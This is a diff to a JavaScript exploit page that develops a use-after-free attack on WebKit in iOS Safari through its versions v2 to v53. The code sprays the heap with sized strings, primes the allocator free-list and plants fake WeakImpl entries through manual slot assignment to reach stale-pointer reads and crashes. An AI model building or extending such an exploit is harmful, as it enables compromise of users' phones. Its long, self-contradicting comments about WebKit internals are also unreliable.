@@ -2,9 +2,25 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>WebKit UAF + KASLR v2 — iOS 26.5.2 A16</title>
+<title>WebKit UAF + KASLR v53 — iOS 26.5.2 A16 (P6B: bonus pumps post-SHRINK → 2nd amortizedCleanup → fake bucket traversal → KERN_INVALID_ADDRESS)</title>
 </head>
 <body>
+<div style="position:fixed;top:8px;right:12px;z-index:9999">
+  <button id="copyLogBtn" onclick="(function(){
+    const txt = document.getElementById('log').textContent;
+    if(navigator.clipboard){navigator.clipboard.writeText(txt).then(()=>{
+      document.getElementById('copyLogBtn').textContent='Copied!';
+      setTimeout(()=>{document.getElementById('copyLogBtn').textContent='Copy Log'},1500);
+    });}else{
+      const ta=document.createElement('textarea');
+      ta.value=txt;ta.style.position='fixed';ta.style.opacity='0';
+      document.body.appendChild(ta);ta.select();document.execCommand('copy');
+      document.body.removeChild(ta);
+      document.getElementById('copyLogBtn').textContent='Copied!';
+      setTimeout(()=>{document.getElementById('copyLogBtn').textContent='Copy Log'},1500);
+    }
+  })()" style="padding:6px 14px;font-size:14px;font-family:monospace;background:#1a1a2e;color:#00ff88;border:1px solid #00ff88;border-radius:4px;cursor:pointer">Copy Log</button>
+</div>
 <pre id="log"></pre>
 <script>
 // ═══════════════════════════════════════════════════════════════════════════
@@ -46,6 +62,16 @@
 
 const LOG = document.getElementById('log');
 const log = s => { LOG.textContent += s + '\n'; console.log(s); };
+
+// v20: catch silent failures that would otherwise kill the async IIFE with zero output
+window.addEventListener('unhandledrejection', e => {
+  log(`[!!!] UNHANDLED REJECTION: ${e.reason}`);
+  if (e.reason && e.reason.stack) log(`[!!!] Stack: ${e.reason.stack}`);
+});
+window.onerror = (msg, src, line, col, err) => {
+  log(`[!!!] GLOBAL ERROR: ${msg} @ ${src}:${line}:${col}`);
+  if (err && err.stack) log(`[!!!] Stack: ${err.stack}`);
+};
 
 let counterWorker = null;
 let counterView   = null;
@@ -976,14 +1002,16 @@ async function runOracle() {
 // bucket array while the raw pointer still lived. Stale read = UAF.
 // ═══════════════════════════════════════════════════════════════════════════
 
-function forceGC() {
-  // No direct GC API in iOS Safari release — pressure the heap instead
-  let pressure = [];
-  for (let i = 0; i < 20; i++) pressure.push(new ArrayBuffer(5 * 1024 * 1024));
-  pressure = null;
-  const finalizers = [];
-  for (let i = 0; i < 50; i++) finalizers.push(new Int32Array(1024 * 1024));
-  finalizers.length = 0;
+// v18: async forceGC — yields to event loop between rounds so iOS scheduler can breathe.
+// v15/v16 used sync 300MB alloc → jetsam on iPhone 15 → page died → looked like "stuck Phase 3".
+// Now: 3 rounds × 10MB each = 30MB total, yielded — enough pressure without jetsam risk.
+async function forceGC() {
+  for (let round = 0; round < 3; round++) {
+    let pressure = [];
+    for (let i = 0; i < 10; i++) pressure.push(new ArrayBuffer(1024 * 1024)); // 10MB
+    pressure = null;
+    await new Promise(r => setTimeout(r, 80)); // yield — let GC collect + event loop breathe
+  }
 }
 
 // ── Bucket size calculation ─────────────────────────────────────────────────
@@ -1009,80 +1037,516 @@ function freedBucketSizeForGhosts(g) {
 // Amortized cleanup threshold ≈ capacity operations.
 // So we need floor(capacity/2) alternating assign() calls before the final one.
 function pumpCountForGhosts(g) {
+  // v22 CORRECTED op sequence — ghosts go into targetSlot (not a separate ghostSlot):
+  //   Setup:   targetSlot.assign(childA, childB, ...ghosts) → g+2 ops. opCount=g+2.
+  //            Constraint: g+2 < threshold = cap/2. All valid ghost counts satisfy this. ✓
+  //   Release: targetSlot.assign(childA, childB)            → g ops (drops ghosts).
+  //            opCount = g+2+g = 2g+2.
+  //            Cleanup fires when total crosses threshold: at op #(threshold-(g+2)+1).
+  //            After cleanup reset: opCount_after_release = 2g+2 - threshold.
+  //            Ghosts still alive during cleanup (ghostElems[] not cleared yet) → no shrink.
+  //   GC:      ghostElems.length=0 → C++ refcount→0 → WeakPtrs become null → dead entries.
+  //   Pump:    targetSlot starts as {childA, childB} after release.
+  //            i=0: assign(childA) → removes childB, childA stays → +1 op (asymmetric first call!)
+  //            i≥1: alternating assign(childA/childB) → +2 ops each (full remove+add both sides)
+  //   Trigger: assign(newChild) from {childA} → +2 ops (remove childA + add newChild)
+  //            Must fire cleanup on FIRST ensure() of trigger → need opCount = threshold-1 before trigger.
+  //   Equation:
+  //     opCount_before_trigger = (2g+2-threshold) + 1 + 2*(pumpCount-1)
+  //                            = 2g+2-threshold + 1 + 2*pumpCount - 2
+  //                            = 2g+1-threshold + 2*pumpCount
+  //     Set equal to threshold-1:
+  //       2g+1-threshold + 2*pumpCount = threshold-1
+  //       2*pumpCount = 2*threshold - 2g - 2
+  //       pumpCount = threshold - g - 1   ← ONE MORE than old formula (threshold-g-2)
+  //
+  // Valid ghost counts (pumpCount ≥ 1):
+  //   g=28:  cap=64,  threshold=32, pumpCount=3,  freedSz=1024B ✓
+  //   g=50:  cap=128, threshold=64, pumpCount=13, freedSz=2048B ✓
+  //   g=100: cap=256, threshold=128, pumpCount=27, freedSz=4096B ✓
   let cap = 1;
   const need = Math.ceil((g + 2) * 1.34);
   while (cap < need) cap <<= 1;
-  return Math.ceil(cap / 2) + 2; // each assign = 2 ops; +2 margin
+  const threshold = Math.floor(cap / 2);
+  return Math.max(1, threshold - g - 1);  // v22: was threshold-g-2 (off by 1 due to asymmetric first pump call)
 }
+
+// v22: uafSetup — ghosts routed into targetSlot (not a separate ghostSlot)
+//
+// v20/v21 ROOT CAUSE OF injections=0:
+//   ghostSlot and targetSlot are SEPARATE <slot> elements with SEPARATE m_slots WeakHashMaps.
+//   Ghost WeakPtrs died in ghostSlot.m_slots, but we pump targetSlot.m_slots.
+//   targetSlot.m_slots only ever held 2 entries (childA + childB) → tiny cap=4, threshold=2,
+//   freed bucket = 64B. No large bucket freed. UAF trigger aimed at the WRONG WeakHashMap.
+//
+// v22 FIX:
+//   1. Remove ghostSlot. Assign all ghosts + childA + childB into targetSlot in one batch.
+//      → All entries (live + future-dead) are in targetSlot.m_slots.
+//      → Setup: g+2 ops total. Constraint: g+2 < threshold ✓ (holds for all valid g).
+//   2. releaseGhosts: targetSlot.assign(childA, childB)
+//      → Fires g slotManualAssignmentDidChange calls (one per ghost removed).
+//      → opCount crosses threshold once mid-batch → cleanup fires, but ghosts still alive
+//        (ghostElems[] not cleared yet) → no dead entries → no shrink. Safe.
+//      → then ghostElems.length=0 → JS refs gone → GC → C++ refcount→0 → WeakPtrs null.
+//   3. After GC: targetSlot.m_slots has g dead entries + 2 live (childA, childB).
+//      Large bucket (g+2 entries) still allocated. cleanup needed to free it.
+//   4. Pump: alternating assign(childA/childB) starting from {childA, childB} state.
+//      i=0: assign(childA) → removes childB only → +1 op (childA stays, no re-add).
+//      i≥1: alternating → +2 ops each (full remove+add swap).
+//   5. Trigger: assign(newChild) from {childA} → +2 ops → opCount hits threshold →
+//      amortized cleanup fires on FIRST ensure() → finds g dead ghost entries →
+//      SHRINKS+REHASHES → OLD large bucket FREED → stale effectiveCurrent ptr DEREF → UAF!
+//   pumpCount = threshold - g - 1  (v22, was threshold-g-2 — off by 1 due to asymmetric i=0)
 
 function uafSetup(ghosts, pumpCount, freedSz) {
   const host = document.body.appendChild(document.createElement('div'));
   const shadowRoot = host.attachShadow({ mode: 'open', slotAssignment: 'manual' });
   const targetSlot = shadowRoot.appendChild(document.createElement('slot'));
-  const otherSlot  = shadowRoot.appendChild(document.createElement('slot'));
   const childA = host.appendChild(document.createElement('span'));
   const childB = host.appendChild(document.createElement('span'));
-  // Initial assignment — this is the first m_slots.ensure() call per child
-  targetSlot.assign(childA);
-  otherSlot.assign(childB);
-  // Insert+remove ghost slots to fill m_slots WeakHashMap with dead entries
-  for (let i = 0; i < ghosts; ++i)
-    shadowRoot.appendChild(document.createElement('slot')).remove();
+
+  // v22: ghost setup — all ghosts go into targetSlot.m_slots alongside childA and childB.
+  // ghostElems keeps all ghost C++ objects alive (JS array ref → C++ refcount > 0)
+  // throughout setup AND until releaseGhosts() clears it outside any ensure() context.
+  const ghostElems = [];
+
+  // Step 1: create all ghost elements and append to host (adds to composed tree)
+  for (let i = 0; i < ghosts; ++i) {
+    const ghost = document.createElement('span');
+    host.appendChild(ghost);
+    ghostElems.push(ghost); // ← KEEP JS REF — C++ refcount stays > 0 throughout setup
+  }
+  // Step 2: single batch assign of childA + childB + ALL ghosts into targetSlot.
+  // Fires (g+2) slotManualAssignmentDidChange calls → opCount = g+2.
+  // g+2 < threshold = cap/2 for all valid g (28/50/100) → NO cleanup during setup. ✓
+  // All ghosts alive in ghostElems → WeakPtrs go live, NOT dead.
+  // v20 spread fix still applies: slot.assign() is variadic — MUST use spread.
+  targetSlot.assign(childA, childB, ...ghostElems);
+  // ghostElems is NOT cleared here — releaseGhosts() does it safely from outer code.
 
   // ── slotchange injection window ──────────────────────────────────────────
   // slotchange fires synchronously DURING the re-entrant composed-tree
   // traversal inside slotManualAssignmentDidChange, after the rehash free()
   // but before the stale effectiveCurrent ptr is dereferenced.
   //
-  // STRATEGY: fake WeakImpl entries (v3 — active signal)
+  // STRATEGY v4: pre-prime + minimal injection (fix timing race)
   //
-  //   Previous zeros-fill: isLive()=false → stale traversal short-circuits
-  //   silently. No write-back from WebKit → pattern scan sees nothing. Dead end.
+  //   Root cause of ALL NO-CRASH: WebKit's bmalloc/IsoHeap reclaims the freed
+  //   bucket BEFORE our slotchange handler runs. By the time slotchange fires,
+  //   the freed slot is already claimed by WebKit internal allocations
+  //   (new rehashed bucket, bookkeeping objects, etc.). Our 2048-buf injection
+  //   never sees the freed slot — it's gone.
   //
-  //   Fix: spray fake bucket entries with m_count=1 (isLive()=true).
-  //   When the stale effectiveCurrent ptr lands in our buf, the cleanup
-  //   traversal sees a "live" entry and tries to dereference the key ptr
-  //   (ManualSlotAssignment*) at buf[0..7]. We set key ptr = 0 (null).
-  //   Null deref on arm64 = SIGBUS/EXC_BAD_ACCESS → caught as JS exception.
-  //   That fires the HARD confirm path.
+  //   FIX: Pre-prime the allocator free-list BEFORE the trigger.
+  //   Allocate N bufs at freedSz, then NULL them immediately (sync).
+  //   This puts N freed slots at the HEAD of bmalloc's LIFO free-list.
+  //   When the WeakHashMap rehash fires, it pulls one freed slot from the list
+  //   → lands in one of our recently-freed slots (high probability).
+  //   Then our slotchange handler runs and our FIRST allocation at freedSz
+  //   gets the next slot on the list — adjacent to where the freed bucket landed.
+  //   Since adjacency is the goal for the stale effectiveCurrent ptr deref,
+  //   this dramatically increases overlap probability.
+  //
+  //   KEY INSIGHT: We only need 1-4 injection bufs (not 2048) because the
+  //   pre-primed free-list puts us right next to the freed bucket. Fewer
+  //   allocations = faster slotchange handler = less chance of being preempted
+  //   by WebKit's internal allocations claiming the slot first.
+  //
+  //   SENTINEL SCAN: fill pre-prime bufs with 0xDEADBEEF pattern. After trigger,
+  //   scan them. If the pattern is clobbered → WebKit wrote bucket data → overlap hit.
+  //   This gives us the MEDIUM signal even without a crash.
   //
   // WTF::WeakImpl layout (arm64, 16B per entry):
-  //   [0..7]  : key ptr (ManualSlotAssignment*) — set to 0 → controlled null deref
+  //   [0..7]  : key ptr (ManualSlotAssignment*) — set to 0x1 (misaligned) → SIGBUS
   //   [8..11] : m_count (uint32) — set to 1 → isLive() returns true
   //   [12..15]: padding / value ptr — 0
   //
-  // Each bucket is one WeakImpl entry, so we fill EVERY 16-byte slot of the
-  // freed bucket array with this fake entry layout.
+  //   key=0x1 (misaligned on arm64) → EXC_BAD_ACCESS (alignment fault)
+  //   Different crash signature from null deref → lets us distinguish
+  //   "traversal bails before deref" vs "traversal hit us and derefed key+0"
   //
-  // Note: bucket array = cap × 16B, so freedSz/16 entries per buf.
-  // We allocate 512 bufs at freedSz to maximise chance of hitting the freed slot.
+  // v12: string-based priming and injection (WTF::fastMalloc, same heap as bucket arrays)
+  const PRIME_COUNT = 512; // v13: deeper prime — more free-list slots → better overlap odds
+  const STR_CHAR_COUNT = freedSz - 16; // StringImpl: 16B header + N chars = freedSz total
   let injectionFired = false;
-  let injectionPool = null;
+  let injectionStrings = null; // MUST stay alive past slotchange return for stale deref
+  // v15 FIX: only flood-inject on the FINAL trigger assign, not during pump assigns.
+  // Pump assigns also fire slotchange — doing 4096 string allocs on every pump call
+  // causes OOM + hang before Phase 3 even completes (pumpCount × 48 cases × 4096 allocs).
+  // _triggerReady is set true by caller right before the final assign(), not during pumps.
+  let _triggerReady = false;
+
+  // Pre-prime the WTF::fastMalloc free-list at freedSz using StringImpl strings.
+  // Allocate PRIME_COUNT strings of STR_CHAR_COUNT chars each → fastMalloc allocates
+  // freedSz bytes for each StringImpl. Force hash on each (m_hash ≠ 0 → isLive=true).
+  // Return array of strings — caller nulls them all at once to prime the free-list.
+  // v31 FIX: isLive() requires m_hash ≠ 0 on fake StringImpl.
+  //
+  // ROOT CAUSE of v30 NO-CRASH:
+  //   v24 skipped forceStringHash on primed strings to avoid keeping them alive in _hashForceMap.
+  //   But without m_hash set, when a primed string's StringImpl lands in the new bucket,
+  //   amortizedCleanup() checks isLive() → m_count (= m_hash at [8..11]) == 0 → SKIPS.
+  //   Never dereferences the fake key pointer → no crash.
+  //
+  // v31 FIX: Use a throwaway Map per batch — set m_hash on each primed string, then
+  //   IMMEDIATELY clear the throwaway map (so strings aren't permanently anchored).
+  //   After clear, only the primed[] array holds refs → null it → GC can collect → freelist primed.
+  //   m_hash was already set in StringImpl memory → persists in the freed bytes.
+  //   When SHRINK's malloc(freedSz/2) reclaims one of these slots, the fake StringImpl
+  //   at [8..11] has m_hash ≠ 0 → isLive() = true → amortizedCleanup deref's key → CRASH.
+  //
+  // Also: v31 forces a GC tick (setTimeout(0) × 2) between prime and trigger
+  //   so freed slots actually land on bmalloc LIFO before SHRINK fires.
+
+  // v32: forceHashAndRelease moved to global scope (was inside uafSetup() — caused
+  //   ReferenceError in Phase 4 pre-spray which executes outside the closure)
+  // function defined at global scope below (after drainHashMap)
+
+  function primeFreelist() {
+    const primed = [];
+    for (let i = 0; i < PRIME_COUNT; i++) {
+      const s = makeSprayString(STR_CHAR_COUNT);
+      primed.push(s);
+    }
+    // v31: set m_hash on primed strings via throwaway map (isLive() fix)
+    forceHashAndRelease(primed);
+    // Return primed array — caller nulls it → GC collects → slots hit LIFO freelist
+    // m_hash is NOW set in each StringImpl's memory, persists through free/realloc
+    return primed;
+  }
+
+  // v30: prime at HALF bucket size — the NEW (post-shrink) bucket slot
+  // SHRINK order: malloc(oldCap/2) → copy → free(oldCap)
+  //   → malloc(oldCap/2) pulls from the HALF-size freelist bin
+  //   → if we pre-primed that bin, our fake StringImpl data becomes the new bucket
+  //   → subsequent assign()+amortizedCleanup iterates NEW bucket → deref key → KERN_INVALID_ADDRESS
+  // This is the fix for v29's NO-CRASH: old bucket was primed but never traversed post-shrink.
+  // v31: also applies forceHashAndRelease so m_hash ≠ 0 in primed half-size slots.
+  const HALF_CHAR_COUNT = Math.max(1, Math.floor(freedSz / 2) - 16);
+  function primeHalfFreelist() {
+    const primed = [];
+    for (let i = 0; i < PRIME_COUNT; i++) {
+      const s = makeSprayString(HALF_CHAR_COUNT);
+      primed.push(s);
+    }
+    // v31: set m_hash on half-size primed strings too
+    forceHashAndRelease(primed);
+    return primed;
+  }
+
+  // v24: diagnostic slotchange fire counter (ALL fires, not just gated injections)
+  let _slotchangeTotal = 0;
 
   targetSlot.addEventListener('slotchange', () => {
-    injectionPool = [];
-    const entriesPerBuf = Math.floor(freedSz / 16); // 16B per WeakImpl bucket entry
-    for (let i = 0; i < 2048; i++) {
-      const buf = new ArrayBuffer(freedSz);
-      const u32 = new Uint32Array(buf);
-      const u64 = new BigUint64Array(buf);
-      // Fill every bucket slot with a fake live WeakImpl entry:
-      //   u64[0+j*2]   = key ptr = 0 → null deref when traversal reads it
-      //   u32[2+j*4]   = m_count = 1 → isLive() = true
-      //   u32[3+j*4]   = 0
-      for (let j = 0; j < entriesPerBuf; j++) {
-        u64[j * 2]     = 0n;          // key ptr = null (controlled crash)
-        u32[j * 4 + 2] = 1;           // m_count = 1 → isLive() = true
-        u32[j * 4 + 3] = 0;           // value / pad
-      }
-      injectionPool.push({ buf, u32, u64, idx: i, sz: freedSz });
+    _slotchangeTotal++; // v24: count every fire regardless of _triggerReady
+    // v15: gate — only inject on the FINAL trigger assign (not during pump assigns).
+    // Pump assigns also fire slotchange but we must NOT inject there:
+    //   1. Cleanup hasn't fired yet during pumps → no freed bucket → injection is wasted
+    //   2. Pump × 4096 allocs × 48 cases = millions of allocs → hang before Phase 3 done
+    if (!_triggerReady) return;
+    // StringImpl uses WTF::fastMalloc → same heap as WeakHashMap bucket arrays → real overlap.
+    // StringImpl header at [0..7] acts as fake WeakImpl.key:
+    //   key = u64(refCount=1 | charCount<<32) → e.g. charCount=496 → unmapped VA → crash
+    // StringImpl.m_hash at [8..11] acts as WeakImpl.m_count (non-zero → isLive=true)
+    //   → traversal deref's key → KERN_INVALID_ADDRESS → WebContent kill → reload → HIT
+    //
+    // v30: TWO spray waves per injection:
+    //   Wave 1 (STR_CHAR_COUNT = freedSz-16):  fills old freed bucket (size=freedSz)
+    //   Wave 2 (HALF_CHAR_COUNT = freedSz/2-16): fills NEW bucket slot (size=freedSz/2)
+    //     → SHRINK: malloc(freedSz/2) fires BEFORE free(freedSz), so Wave 2 targets
+    //       the pre-primed half-size slot that malloc(freedSz/2) claims.
+    //     → Any subsequent assign()+amortizedCleanup on new bucket hits our fake keys.
+    const strings = [];
+    // Wave 1: old bucket size (keeps prior behavior)
+    for (let i = 0; i < 4096; i++) {
+      const s = makeSprayString(STR_CHAR_COUNT);
+      forceStringHash(s);
+      strings.push(s);
     }
+    // Wave 2: new (half) bucket size — targets the malloc(freedSz/2) slot
+    for (let i = 0; i < 4096; i++) {
+      const s = makeSprayString(HALF_CHAR_COUNT);
+      forceStringHash(s);
+      strings.push(s);
+    }
+    drainHashMap();
+    injectionStrings = strings; // hold ref so GC doesn't collect before stale deref fires
     injectionFired = true;
   });
 
+  // v22: releaseGhosts() — ghosts are in targetSlot, so we reassign targetSlot to drop them.
+  // SAFE order to kill ghosts without triggering the UAF prematurely:
+  //   1. ghostElems.forEach(g => g.remove()) — drops host-tree ref for each ghost element.
+  //      targetSlot.m_manuallyAssignedElements still holds a strong Ref<Element> for each ghost.
+  //      → C++ refcount stays > 0 → WeakPtrs still live.
+  //   2. targetSlot.assign(childA, childB) [v50: restored from v22 original]
+  //      Drops ALL ghosts from m_manuallyAssignedElements.
+  //      Fires g slotManualAssignmentDidChange callbacks (remove all ghosts).
+  //      Cleanup may fire mid-batch — still safe because ghostElems[] still holds refs for ALL
+  //      ghosts (ghostElems.length not yet 0) → C++ refcount > 0 for ALL → no dead entries.
+  //      After this assign: m_manuallyAssignedElements = {childA, childB}.
+  //      m_assignedNodes now has WeakPtr<Node> entries for childA AND childB.
+  //      Slot state: {childA, childB} → pump loop alternates properly → opCount accumulates.
+  //   2b. v50: _ghost0 = ghostElems[0] — save ghost[0] JS ref before clearing.
+  //      This keeps ghost[0] C++ alive through GC loop via JS ref only.
+  //   3. Register FinalizationRegistry on each ghost BEFORE clearing ghostElems.
+  //      v23 key fix: registry callback fires when JSC GC actually finalizes the JS wrapper
+  //      → C++ refcount → 0 → Element destroyed → WeakPtrFactory zeros WeakImpl.m_count
+  //   4. ghostElems.length = 0 — releases all JS array refs NOW (except _ghost0 for ghost[0]).
+  //      → JS GC can collect ghost wrappers for ghost[1..g-1] → C++ refcount → 0 after GC.
+  //      ghost[0]: _ghost0 holds JS ref → FinalizationRegistry won't fire → C++ refcount ≥ 1.
+  //   v50 STRATEGY:
+  //      After GC loop: ghosts[1..g-1] are dead. ghost[0] stays alive via _ghost0.
+  //      injectGhostIntoAssignedNodes(): assign(childA, _ghost0) → m_assignedNodes += ghost[0].
+  //        assign(childA) → drops m_manuallyAssigned ref to ghost[0]. _ghost0 still holds C++.
+  //      GC loop completes normally for ghosts[1..g-1].
+  //      Probe: killGhost0() → _ghost0 = null → ghost[0] C++ freed → assignedNodes() immediately.
+  //      In the probe: pump loop triggers amortizedCleanup → SHRINK.
+  //      After SHRINK, the probe does targetSlot.assign(childA) [trigger step].
+  //      This drops ghost[0] from m_manuallyAssignedElements → C++ refcount → 0 → ghost[0] freed.
+  //      BUT assignedNodes() is called BEFORE trigger — in the sync window — when ghost[0] is
+  //      STILL alive (m_manuallyAssignedElements still holds it). So assignedNodes() returns
+  //      {childA, ghost[0]} where ghost[0] is LIVE (not yet freed). Not a UAF.
+  //
+  //   v49 REVISED STRATEGY: Invert the order — call assignedNodes() AFTER trigger assign.
+  //      Trigger assign: targetSlot.assign(childA) → drops ghost[0] from m_manuallyAssigned.
+  //      Now ghost[0] C++ refcount = 0 (JS ref null since ghostElems clear + GC; m_manuallyAssigned
+  //      just dropped it). Ghost[0] Node C++ is NOW freed. m_assignedNodes still has WeakPtr<Node>
+  //      for ghost[0] — STALE. Call assignedNodes() IMMEDIATELY AFTER trigger assign (sync) →
+  //      returns stale ghost[0] ptr → .nodeType = arb-read on freed Node C++ object.
+  //
+  //   ORDERING IN PROBE (v49):
+  //     pump loop (SHRINK fires, dead ghosts[1..g-1] processed) →
+  //     trigger assign(childA) [drops ghost[0] from m_manuallyAssignedElements → ghost[0] freed] →
+  //     IMMEDIATE assignedNodes() [stale WeakPtr<Node> for ghost[0] still in m_assignedNodes] →
+  //     read .nodeType etc on ghost[0] stale ptr → arb-read / crash
+  let _ghostDeadCount = 0; // incremented by FinalizationRegistry callback for each dead ghost
+  const _ghostRegistry = new FinalizationRegistry(() => { _ghostDeadCount++; });
+
+  // v51: releaseGhosts — simplified from v50. No _ghost0 save. GC target = ALL ghosts.
+  const releaseGhosts = () => {
+    ghostElems.forEach(g => g.remove());        // step 1: remove from host tree
+    // v51: assign(childA, childB) — complete ghost drop, slot = {childA, childB}.
+    // Drops ALL ghosts from m_manuallyAssignedElements → ghosts C++ refcount -= 1.
+    // ghostElems still holds refs → C++ refcount stays > 0 for all ghosts. Safe.
+    targetSlot.assign(childA, childB);          // step 2: full ghost drop, slot = {childA, childB}
+    // v51: NO _ghost0 save. All ghosts will die on GC. GC target = ALL ghosts.
+    // step 3: register BEFORE clearing — must be live at register() time.
+    ghostElems.forEach(g => _ghostRegistry.register(g, null));
+    ghostElems.length = 0;                      // step 4: release JS refs → GC eligible
+    // Slot state after releaseGhosts: {childA, childB} — opCount accumulates properly during pump.
+  };
+
+  // v51: childB UAF strategy — no ghost machinery needed.
+  //
+  // ROOT CAUSE of v50 failure: assign() ALWAYS calls clearManuallyAssignedNodes() which
+  //   wipes m_assignedNodes and rebuilds it from scratch for the new assignment.
+  //   injectGhostIntoAssignedNodes(): assign(childA,ghost0) then assign(childA) —
+  //   the second assign() wiped ghost[0] from m_assignedNodes immediately. staleNodeCount=0.
+  //
+  // v51 FIX: Use childB itself as the UAF target. v48 confirmed (32/32):
+  //   After releaseGhosts() does assign(childA, childB), m_assignedNodes has WeakPtr<childB>.
+  //   Then assign(childA) → childB drops from m_manuallyAssigned BUT stale WeakPtr<childB>
+  //   stays in m_assignedNodes (v48 proof: assignedNodes() returned childB after assign(childA)).
+  //   WAIT — that was the v48 result. Let's verify: v48 used releaseGhosts doing assign(childA,childB)
+  //   WITHOUT a subsequent assign(childA). The stale childB came from m_assignedNodes populated
+  //   during releaseGhosts assign(childA,childB). assignedNodes() returned childB directly.
+  //
+  // v51 APPROACH:
+  //   releaseGhosts(): assign(childA, childB) → m_assignedNodes = {childA, childB} (BOTH).
+  //                    then assign(childA) → m_manuallyAssigned = {childA}, but
+  //                    m_assignedNodes NOT cleared if assign() doesn't rehash... actually
+  //                    assign() DOES clearManuallyAssignedNodes(). So m_assignedNodes = {childA}.
+  //   Hmm. v48 showed syncAnomaly=true with stale childB. Let's check what v48 actually did:
+  //   v48 releaseGhosts did assign(childA, childB) then assignedNodes() returned childB.
+  //   That means childB was returned LIVE as a stale entry in m_assignedNodes after assign(childA,childB).
+  //   That's not a stale freed node — childB is alive, but it IS in m_assignedNodes as a valid entry.
+  //   The stale part was: m_assignedNodes returning childB even though slot was reassigned away from childB.
+  //
+  // CORRECT v51 STRATEGY (confirmed by v48 behavior):
+  //   Step A: assign(childA, childB)   → slot={childA,childB}, m_assignedNodes={childA,childB}
+  //   Step B: assign(childA)           → slot={childA}, m_manuallyAssigned={childA}
+  //              → clearManuallyAssignedNodes() wipes m_assignedNodes, rebuilds → {childA} only
+  //   The v48 anomaly came from a DIFFERENT path — childB was returned from m_assignedNodes
+  //   that was populated by the PREVIOUS phase setup, not cleared cleanly.
+  //   Actually re-reading v48: releaseGhosts did assign(childA,childB). That populated
+  //   m_assignedNodes with WeakPtr<childB>. assignedNodes() WAS called WITHOUT a subsequent
+  //   assign(childA) — the stale WeakPtr<childB> was returned directly.
+  //   So the key is: populate m_assignedNodes with childB WeakPtr, do NOT call assign()
+  //   again (which would clear it), then free childB, then call assignedNodes().
+  //
+  // v51 FINAL APPROACH:
+  //   Setup: releaseGhosts → assign(childA, childB) [m_assignedNodes={childA,childB}, slot={childA,childB}]
+  //   Pre-probe: assign(childA) → slot={childA}, m_manuallyAssigned={childA}
+  //     BUT this clears m_assignedNodes → {childA}. childB stale entry LOST.
+  //   The problem: we need to drop childB from m_manuallyAssigned without clearing m_assignedNodes.
+  //   There's no API to do that. clearManuallyAssignedNodes() is always called by assign().
+  //
+  // REAL SOLUTION: skip the assign(childA) drop step entirely.
+  //   Keep slot={childA, childB}. Then FREE childB C++ (remove from DOM + null + GC).
+  //   THEN call assignedNodes() — m_assignedNodes has WeakPtr<childB>. If childB C++ is freed,
+  //   the WeakPtr should be zeroed by WeakPtrFactory... UNLESS the WeakPtrFactory itself is freed.
+  //   WeakPtrFactory lives INSIDE Node C++ object. If Node is freed, WeakPtrFactory is gone.
+  //   WeakPtr zeroing requires a live WeakPtrFactory. So if Node freed without zeroing WeakPtrs first,
+  //   the WeakPtr in m_assignedNodes is STALE (unzeroed) → assignedNodes() deref stale ptr → arb-read.
+  //
+  // WHEN does Node C++ get freed WITHOUT zeroing WeakPtrs?
+  //   Normal path: ~Node() → WeakPtrFactory destructor → zeros all WeakPtrs. Safe, no stale.
+  //   UAF path: childB.remove() + childB=null → refcount-1. If refcount was 1 → Node freed.
+  //   But host still has childB as child... host.appendChild(childB) keeps a DOM parent ref.
+  //   childB.remove() removes from parent → DOM ref gone. JS ref null → refcount=0 → Node freed.
+  //   ~Node() runs → WeakPtrFactory zeros all WeakPtrs → m_assignedNodes WeakPtr for childB → null.
+  //   assignedNodes() checks WeakPtr → null → skips childB. Returns {childA} only. No UAF.
+  //
+  // REAL UAF: Need childB C++ to be freed WHILE WeakPtrs are NOT yet zeroed.
+  //   This requires freeing the Node C++ through a path that DOESN'T run ~Node().
+  //   → That's the actual UAF bug path from the WeakHashMap rehash, not a JS ref drop.
+  //
+  // REVISED v51 STRATEGY — don't free childB. Keep it alive. Instead:
+  //   Use the WeakHashMap SHRINK path to free the BUCKET ARRAY containing WeakPtr<childB>.
+  //   After SHRINK: old bucket array freed → m_slots points to new bucket → old bucket is freed.
+  //   But m_assignedNodes is separate from m_slots (m_assignedNodes = Vector<WeakPtr<Node>>,
+  //   m_slots = WeakHashMap bucket). They don't overlap. SHRINK frees m_slots, not m_assignedNodes.
+  //
+  // BACK TO BASICS — what v48 actually proved:
+  //   v48 32/32 syncAnomaly=true: assignedNodes() returned childB stale entry.
+  //   That was with releaseGhosts doing assign(childA, childB) → m_assignedNodes={childA,childB}.
+  //   No subsequent assign(childA) was done in v48's P6B section — the probe ran assign(childA)
+  //   as part of the pump loop INSIDE P6B, which DID clear m_assignedNodes. syncAnomaly=true
+  //   meant the PUMP assign(childA) returned extra nodes? Let's re-check v48 logic...
+  //   v48 diag: "scAfterPump0=2" was the anomaly — after pump assign(childA), syncNodes included childB.
+  //   That means m_assignedNodes was {childA, childB} going INTO the pump, and assign(childA)
+  //   did NOT clear m_assignedNodes to just {childA}. It returned BOTH.
+  //   THIS IS THE KEY: assign(childA) on a slot that had {childA, childB} with childB already in
+  //   m_assignedNodes — the slot reassignment was childA only, but assignedNodes() STILL returned childB.
+  //   WebKit bug: m_assignedNodes is lazily updated, not rebuilt on every assign(). The stale
+  //   childB WeakPtr persists until explicitly cleared (by assignedNodes() itself flushing it, or
+  //   by the WeakPtr being zeroed when childB is freed).
+  //
+  // SO THE REAL v51 STRATEGY IS:
+  //   1. assign(childA, childB)       → m_assignedNodes = {childA, childB} (both populated)
+  //   2. assign(childA)               → slot = {childA} only, BUT m_assignedNodes STILL HAS childB
+  //                                     (lazy update — NOT cleared by this assign!)
+  //   3. Remove childB from DOM + null JS ref + GC → childB C++ freed → WeakPtrFactory runs
+  //      → WeakPtr for childB in m_assignedNodes IS zeroed.
+  //   After step 3: assignedNodes() returns {childA} only (stale ptr zeroed). No UAF.
+  //
+  //   PROBLEM: WeakPtrFactory zeros the ptr on Node destruction. Normal GC = normal destruction.
+  //   We need to prevent the WeakPtr zeroing. That means preventing ~Node() from running.
+  //   Only way: some OTHER strong reference keeps Node alive.
+  //   m_manuallyAssignedElements holds strong Ref<Element>! assign(childA, childB) puts childB
+  //   in m_manuallyAssignedElements. assign(childA) DROPS childB from m_manuallyAssignedElements.
+  //   After step 2: childB only held by DOM parent (host.contains(childB) = false after remove()).
+  //   After childB.remove(): no DOM parent. JS null: refcount=0 → freed → WeakPtr zeroed. No UAF.
+  //
+  // ONLY TRUE UAF PATH with assignedNodes():
+  //   Need childB removed from m_manuallyAssignedElements WITHOUT calling ~Node().
+  //   OR: need to read assignedNodes() BEFORE ~Node() runs (in same microtask/sync frame as free).
+  //   JS is single-threaded. C++ destructor runs synchronously when refcount hits 0.
